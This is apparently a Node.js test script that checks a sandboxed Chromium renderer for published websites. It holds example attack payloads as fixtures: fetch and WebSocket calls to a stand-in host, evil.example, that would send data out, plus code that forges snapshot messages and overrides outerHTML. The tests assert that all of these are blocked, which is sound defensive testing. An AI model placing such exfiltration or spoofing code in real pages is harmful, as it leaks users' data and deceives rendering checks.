/* eslint-disable @typescript-eslint/no-require-imports -- Local real-browser qualification, no providers. */
require('../src/lib/generation/check-website-worker.cjs');
const {publicationSourcePreflight,publicationEntries}=require('../src/lib/projects/publication-compiler.ts');
const {createHash}=require('node:crypto'),assert=require('node:assert/strict');
const hash=b=>createHash('sha256').update(b).digest('hex');
function file(path,contentType,text){const body=Buffer.from(text);return {path,contentType,body,sha256:hash(body)};}
const js='text/javascript; charset=utf-8',css='text/css; charset=utf-8';
const index='<!doctype html><html><head><link rel="stylesheet" href="/assets/app.css"></head><body><div id="root"></div><script type="module" src="/assets/app.js"></script></body></html>';
async function main(){
 let count=0;async function check(name,fn){await fn();count++;console.log(`PASS ${name}`);}
 await check('inline source initializer and unsupported multiple entries are refused',async()=>{
  publicationSourcePreflight('<script type="module" src="/src/main.tsx"></script>');
  assert.throws(()=>publicationSourcePreflight('<script>window.foo=1</script><script type="module" src="/src/main.tsx"></script>'));
  assert.throws(()=>publicationSourcePreflight('<script type="module" src="/src/main.tsx">foo()</script>'));
  assert.throws(()=>publicationEntries(index.replace('</body>','<script type="module" src="/assets/app.js"></script></body>'),[file('/assets/app.js',js,'')]));
 });
 const {renderLocalPublication}=await import('../infra/project-runtime/publication-renderer.mjs');
 const base={origin:'https://fixture.makeborne.site',indexHtml:index,signal:new AbortController().signal};
 const style=file('/assets/app.css',css,'body{color:rgb(10,20,30)}');
 await check('actual Chromium uses retained entry/CSP and ignores forged snapshot postMessage/mainworld DOM overrides',async()=>{
  const code=`document.getElementById('root').innerHTML='<main><h1>Retained source</h1><button>Ready</button></main>'; window.postMessage({type:'makeborne-snapshot',html:'FORGED'},'*'); Object.defineProperty(Element.prototype,'outerHTML',{get(){return 'FORGED'}});`;
  const result=await renderLocalPublication({...base,files:[file('/assets/app.js',js,code),style]});
  assert.match(result.html,/<h1>Retained source<\/h1>/);assert.match(result.rendererId,/^chromium-/);assert.ok(!result.html.includes('FORGED'));
 });
 await check('external request and WebSocket attempts fail publication',async()=>{
  for(const tail of [`fetch('https://evil.example/leak')`,`new WebSocket('wss://evil.example/socket')`])await assert.rejects(renderLocalPublication({...base,files:[file('/assets/app.js',js,`document.getElementById('root').innerHTML='<main>Ready</main>';${tail}`),style]}),/PUBLICATION_RENDER_/);
 });
 await check('missing images and fonts never issue a rendered receipt',async()=>{
  await assert.rejects(renderLocalPublication({...base,files:[file('/assets/app.js',js,`document.getElementById('root').innerHTML='<main><img src="/missing.png"></main>';`),style]}),/PUBLICATION_RENDER_/);
  await assert.rejects(renderLocalPublication({...base,files:[file('/assets/app.js',js,`document.getElementById('root').innerHTML='<main>Font readiness</main>';`),file('/assets/app.css',css,'@font-face{font-family:Bad;src:url(/assets/missing.woff2)}body{font-family:Bad}')]}),/PUBLICATION_RENDER_/);
 });
 await check('busy-loop project is killed by independent browser process deadline',async()=>{
  const start=Date.now();await assert.rejects(renderLocalPublication({...base,files:[file('/assets/app.js',js,'while(true){}'),style]},{timeoutMs:1000}),/PUBLICATION_RENDER_DEADLINE|Timeout/);assert.ok(Date.now()-start<6000);
 });
 await check('abort and wrong qualified renderer fail closed',async()=>{
  await assert.rejects(renderLocalPublication({...base,files:[]},{qualifiedRendererId:'wrong'}),/PUBLICATION_RENDERER_UNQUALIFIED/);
  const controller=new AbortController();controller.abort();await assert.rejects(renderLocalPublication({...base,signal:controller.signal,files:[]}));
 });
 console.log(`${count} publication compiler/browser groups passed.`);
}
if(require.main===module)main().catch(error=>{console.error(error);process.exitCode=1;});
module.exports={file,index};

